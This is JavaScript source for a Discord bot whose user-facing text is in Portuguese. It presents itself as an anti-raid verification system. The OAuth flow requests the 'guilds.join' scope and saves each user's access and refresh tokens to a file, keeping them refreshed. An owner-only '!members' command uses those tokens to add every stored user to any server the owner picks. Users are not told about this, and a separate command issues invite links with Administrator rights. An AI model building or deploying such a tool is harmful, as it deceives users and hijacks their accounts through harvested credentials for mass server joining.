const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    PermissionsBitField 
} = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const bodyParser = require('body-parser');

const config = {
    TOKEN: process.env.TOKEN,
    CLIENT_ID: process.env.CLIENT_ID,
    CLIENT_SECRET: process.env.CLIENT_SECRET,
    REDIRECT_URI: process.env.REDIRECT_URI, 
    PORT: process.env.PORT || 8080,
    GUILD_ID: process.env.GUILD_ID,
    ROLE_ID: process.env.ROLE_ID,
    OWNER_ID: process.env.OWNER_ID
};

const DB_FILE = 'users.json';
const CONFIG_FILE = 'custom_config.json';

let usersDB = {};
if (fs.existsSync(DB_FILE)) usersDB = JSON.parse(fs.readFileSync(DB_FILE));

let botConfig = {
    description: 'Para garantir a segurança de todos contra contas fakes e raids, e para liberar seu acesso aos **Canais**, **Sorteios** e **Eventos**, você precisa se verificar.\n\nClique no botão abaixo para autenticar sua conta de forma segura.',
    image: 'https://i.imgur.com/8Q6QgXq.gif'
};
if (fs.existsSync(CONFIG_FILE)) botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE));

function saveUser(userId, accessToken, refreshToken, expiresIn) {
    const expiresAt = Date.now() + (expiresIn * 1000);
    usersDB[userId] = { accessToken, refreshToken, expiresAt };
    fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
}

function saveConfig() {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2));
}

async function getValidAccessToken(userId) {
    const user = usersDB[userId];
    if (!user) return null;
    if (Date.now() < user.expiresAt - 3600000) return user.accessToken;

    try {
        const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: config.CLIENT_ID,
            client_secret: config.CLIENT_SECRET,
            grant_type: 'refresh_token',
            refresh_token: user.refreshToken
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token, expires_in } = response.data;
        saveUser(userId, access_token, refresh_token, expires_in);
        return access_token;
    } catch (error) { return null; }
}

function getHtml(type, errorDetails = '') {
    const isSuccess = type === 'success';
    const title = isSuccess ? 'VERIFICADO COM SUCESSO' : 'ERRO NA VERIFICAÇÃO';
    const message = isSuccess 
        ? 'Você recebeu o cargo! Já pode fechar essa janela e voltar para o Discord.' 
        : `Ocorreu um problema: <br><br><code>${errorDetails}</code><br><br>Verifique o Console do Railway ou suas configurações.`;
    const icon = isSuccess ? '✔' : '✖';
    const color = isSuccess ? '#00ff00' : '#ff0000';
    
    return `
    <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>${title}</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@300&display=swap');
            body { margin: 0; padding: 0; background-color: #050505; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Roboto', sans-serif; overflow: hidden; }
            .container { position: relative; width: 350px; min-height: 450px; background: #111; border-radius: 20px; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1; }
            .container::before, .container::after { content: ''; position: absolute; top: -4px; left: -4px; right: -4px; bottom: -4px; background: linear-gradient(45deg, #ff0000, #ff0000, #330000, #ff0000); background-size: 400%; border-radius: 24px; z-index: -1; animation: glowing 20s linear infinite; }
            .container::after { filter: blur(25px); }
            @keyframes glowing { 0% { background-position: 0 0; } 50% { background-position: 400% 0; } 100% { background-position: 0 0; } }
            .content { text-align: center; z-index: 2; padding: 20px; }
            .icon { font-size: 80px; margin-bottom: 20px; color: ${color}; text-shadow: 0 0 20px ${color}; }
            h1 { font-family: 'Orbitron', sans-serif; font-size: 24px; color: #ff0000; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; }
            p { color: #ccc; font-size: 16px; line-height: 1.5; margin-bottom: 30px; word-wrap: break-word; }
            code { background: #333; padding: 5px; border-radius: 4px; color: #ff9999; font-family: monospace; }
            .btn { text-decoration: none; color: white; border: 2px solid #ff0000; padding: 10px 30px; border-radius: 5px; font-weight: bold; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
            .btn:hover { background: #ff0000; box-shadow: 0 0 15px #ff0000; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="content">
                <div class="icon">${icon}</div>
                <h1>${title}</h1>
                <p>${message}</p>
                <a href="discord://" class="btn">Voltar ao Discord</a>
            </div>
        </div>
    </body>
    </html>
    `;
}

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMessages],
    partials: [Partials.Channel]
});

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send(getHtml('error', 'Código de autorização não recebido do Discord.'));

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: config.CLIENT_ID,
            client_secret: config.CLIENT_SECRET,
            code,
            grant_type: 'authorization_code',
            redirect_uri: config.REDIRECT_URI,
            scope: 'identify guilds.join'
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token, expires_in } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` } });
        const userId = userResponse.data.id;

        saveUser(userId, access_token, refresh_token, expires_in);

        const guild = client.guilds.cache.get(config.GUILD_ID);
        if (guild) {
            try {
                await guild.members.add(userId, { accessToken: access_token });
            } catch (err) {
                console.log(`Erro ao adicionar membro: ${err.message}`);
            }
            
            const member = await guild.members.fetch(userId).catch(() => null);
            if (member) {
                await member.roles.add(config.ROLE_ID);
            } else {
                throw new Error('Usuário não encontrado no servidor após tentar adicionar.');
            }
        } else {
            throw new Error('Bot não encontrou o Servidor (GUILD_ID incorreto).');
        }

        res.send(getHtml('success'));
    } catch (error) {
        console.error('ERRO:', error.response?.data || error.message);
        const errorMsg = error.response?.data?.error_description || error.response?.data?.error || error.message;
        res.send(getHtml('error', errorMsg));
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || message.author.id !== config.OWNER_ID) return;

    // --- COMANDO: CONFIGURAR APARÊNCIA (!sconfig) ---
    if (message.content === '!sconfig') {
        message.delete().catch(() => {});
        const embed = new EmbedBuilder()
            .setTitle('⚙️ Configuração do Embed')
            .setDescription('Personalize a aparência da mensagem de verificação.')
            .setColor('DarkButNotBlack')
            .addFields(
                { name: 'Descrição Atual', value: botConfig.description.substring(0, 100) + '...' },
                { name: 'Imagem Atual', value: botConfig.image }
            );

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_config_desc').setLabel('📝 Alterar Descrição').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('btn_config_img').setLabel('🖼️ Alterar Imagem').setStyle(ButtonStyle.Secondary)
        );

        return message.channel.send({ embeds: [embed], components: [row] });
    }

    // --- COMANDO: ENVIAR VERIFICAÇÃO (!setup) ---
    if (message.content === '!setup') {
        message.delete().catch(() => {});
        const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
        
        const embed = new EmbedBuilder()
            .setTitle('🛡️ Verificação Obrigatória')
            .setDescription(botConfig.description)
            .setColor('Red')
            .setFooter({ text: 'Sistema de Proteção Anti-Raid • Verificação Segura' })
            .setImage(botConfig.image);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('🔓 Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl)
        );
        
        return message.channel.send({ embeds: [embed], components: [row] });
    }

    // --- COMANDO: PUXAR PARA O SERVER ATUAL (!members) ---
    if (message.content === '!members') {
        message.delete().catch(() => {});
        const targetGuild = message.guild;
        
        const statusMsg = await message.channel.send(`🔄 Iniciando puxada de membros para **${targetGuild.name}**... Isso pode demorar.`);
        
        const users = Object.keys(usersDB);
        let success = 0;
        let fail = 0;

        for (const userId of users) {
            const validToken = await getValidAccessToken(userId);
            if (validToken) {
                try {
                    await targetGuild.members.add(userId, { accessToken: validToken });
                    success++;
                } catch (e) {
                    fail++;
                }
            } else {
                fail++;
            }
            await new Promise(r => setTimeout(r, 1000)); // Delay obrigatório para não tomar ban da API
        }
        statusMsg.edit(`✅ **Processo Finalizado!**\n\n📥 Sucessos: ${success}\n❌ Falhas (Token expirado/Já no server): ${fail}`);
    }

    // --- COMANDO: GERAR LINK DE CONVITE (!gerarlink) ---
    if (message.content === '!gerarlink') {
        message.delete().catch(() => {});
        // Gera link com permissão de Administrador (8)
        const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&permissions=8&scope=bot`;
        
        const embed = new EmbedBuilder()
            .setTitle('🔗 Link de Convite do Bot')
            .setDescription(`Envie este link para adicionar o bot em outro servidor:\n\n[Clique aqui para Adicionar](${inviteUrl})\n\n**Nota:** O bot entrará com permissão de Administrador.`)
            .setColor('Blue');
            
        message.channel.send({ embeds: [embed] });
    }

    // --- COMANDO: SAIR DO SERVIDOR (!quit) ---
    if (message.content === '!quit') {
        message.delete().catch(() => {});
        await message.channel.send('👋 Saindo do servidor conforme solicitado...');
        await message.guild.leave();
    }
});

client.on('interactionCreate', async (interaction) => {
    if (interaction.user.id !== config.OWNER_ID) return;

    if (interaction.isButton()) {
        if (interaction.customId === 'btn_config_desc') {
            const modal = new ModalBuilder().setCustomId('modal_desc_submit').setTitle('Editar Descrição');
            const input = new TextInputBuilder().setCustomId('input_desc').setLabel('Nova Descrição').setStyle(TextInputStyle.Paragraph).setValue(botConfig.description).setRequired(true);
            modal.addComponents(new ActionRowBuilder().addComponents(input));
            await interaction.showModal(modal);
        }
        if (interaction.customId === 'btn_config_img') {
            const modal = new ModalBuilder().setCustomId('modal_img_submit').setTitle('Editar Imagem');
            const input = new TextInputBuilder().setCustomId('input_img').setLabel('Link da Nova Imagem (URL)').setStyle(TextInputStyle.Short).setValue(botConfig.image).setRequired(true);
            modal.addComponents(new ActionRowBuilder().addComponents(input));
            await interaction.showModal(modal);
        }
    }

    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_desc_submit') {
            botConfig.description = interaction.fields.getTextInputValue('input_desc');
            saveConfig();
            await interaction.reply({ content: '✅ Descrição atualizada!', ephemeral: true });
        }
        if (interaction.customId === 'modal_img_submit') {
            botConfig.image = interaction.fields.getTextInputValue('input_img');
            saveConfig();
            await interaction.reply({ content: '✅ Imagem atualizada!', ephemeral: true });
        }
    }
});

app.listen(config.PORT, () => {});
client.login(config.TOKEN);
